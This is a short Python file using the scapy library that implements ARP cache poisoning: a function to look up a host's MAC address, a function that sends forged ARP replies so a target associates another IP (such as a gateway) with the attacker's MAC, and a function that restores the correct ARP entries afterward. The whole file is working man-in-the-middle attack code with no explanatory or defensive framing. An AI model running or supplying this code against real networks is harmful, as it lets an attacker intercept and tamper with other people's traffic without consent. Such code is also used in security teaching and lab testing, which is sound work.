from scapy.all import *
from scapy.layers.l2 import Ether, ARP

def get_mac(ip):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered, _ = srp(packet, timeout=1, verbose=0)
    if answered:
        return answered[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip, target_mac, my_mac):
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=my_mac
    )
    sendp(packet, verbose=0)

def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
    packet_to_gateway = Ether(dst=gateway_mac) / ARP(
        op=2,
        pdst=gateway_ip,
        hwdst=gateway_mac,
        psrc=target_ip,
        hwsrc=target_mac
    )
    sendp(packet_to_gateway, verbose=0)

    packet_to_victim = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=gateway_ip,
        hwsrc=gateway_mac
    )
    sendp(packet_to_victim, verbose=0)
